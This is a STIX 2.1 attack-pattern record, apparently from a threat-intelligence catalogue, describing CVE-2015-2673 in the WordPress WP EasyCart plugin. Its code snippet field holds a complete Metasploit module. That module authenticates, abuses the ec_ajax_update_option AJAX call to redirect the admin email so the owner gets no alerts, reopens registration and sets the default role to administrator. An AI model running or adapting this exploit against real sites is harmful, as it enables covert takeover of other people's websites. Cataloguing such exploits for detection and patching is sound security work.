{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13651e92-6fb1-4dbd-9aee-f72d5ebc76f1",
    "created": "2024-08-14T16:23:49.127776Z",
    "modified": "2024-08-14T16:23:49.12778Z",
    "name": "WordPress WP EasyCart Plugin Privilege Escalation",
    "description": " The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20 allows authenticated users of any user level to set any system option via a lack of validation in the ec_ajax_update_option and ec_ajax_clear_all_taxrates functions located in /inc/admin/admin_ajax_functions.php. The module first changes the admin e-mail address to prevent any notifications being sent to the actual administrator during the attack re-enables user registration in case it has been disabled and sets the default role to be administrator. This will allow for the user to create a new account with admin privileges via the default registration page found at /wp-login.php?action=register. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_easycart_privilege_escalation.rb",
            "external_id": "wp_easycart_privilege_escalation.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2673"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7808"
        },
        {
            "source_name": "reference",
            "url": "https://rastating.github.io/wp-easycart-privilege-escalation-information-disclosure/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress WP EasyCart Plugin Privilege Escalation',\n        'Description' => %q{\n          The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20 allows authenticated\n          users of any user level to set any system option via a lack of validation in the\n          ec_ajax_update_option and ec_ajax_clear_all_taxrates functions located in\n          /inc/admin/admin_ajax_functions.php. The module first changes the admin e-mail address\n          to prevent any notifications being sent to the actual administrator during the attack,\n          re-enables user registration in case it has been disabled and sets the default role to\n          be administrator. This will allow for the user to create a new account with admin\n          privileges via the default registration page found at /wp-login.php?action=register.\n        },\n        'Author' => [\n          'rastating' # Discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2015-2673'],\n          ['WPVDB', '7808'],\n          ['URL', 'https://rastating.github.io/wp-easycart-privilege-escalation-information-disclosure/']\n        ],\n        'DisclosureDate' => '2015-02-25'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])\n      ]\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('wp-easycart', '3.0.21', '1.1.30')\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def set_wp_option(name, value, cookie)\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => wordpress_url_admin_ajax,\n      'vars_get' => { 'action' => 'ec_ajax_update_option' },\n      'vars_post' => { 'option_name' => name, 'option_value' => value },\n      'cookie' => cookie\n    )\n\n    if res.nil?\n      vprint_error('No response from the target.')\n    elsif res.code != 200\n      vprint_warning(\"Server responded with status code #{res.code}\")\n    end\n\n    res\n  end\n\n  def run\n    print_status(\"Authenticating with WordPress using #{username}:#{password}...\")\n    cookie = wordpress_login(username, password)\n    if cookie.nil?\n      print_error('Failed to authenticate with WordPress')\n      return\n    end\n    store_valid_credential(user: username, private: password, proof: cookie)\n    print_good('Authenticated with WordPress')\n\n    new_email = \"#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com\"\n    print_status(\"Changing admin e-mail address to #{new_email}...\")\n    if set_wp_option('admin_email', new_email, cookie).nil?\n      print_error('Failed to change the admin e-mail address')\n      return\n    end\n\n    print_status('Enabling user registrations...')\n    if set_wp_option('users_can_register', 1, cookie).nil?\n      print_error('Failed to enable user registrations')\n      return\n    end\n\n    print_status('Setting the default user role...')\n    if set_wp_option('default_role', 'administrator', cookie).nil?\n      print_error('Failed to set the default user role')\n      return\n    end\n\n    register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')\n    print_good('Privilege escalation complete')\n    print_good(\"Create a new account at #{register_url} to gain admin access.\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-25"
}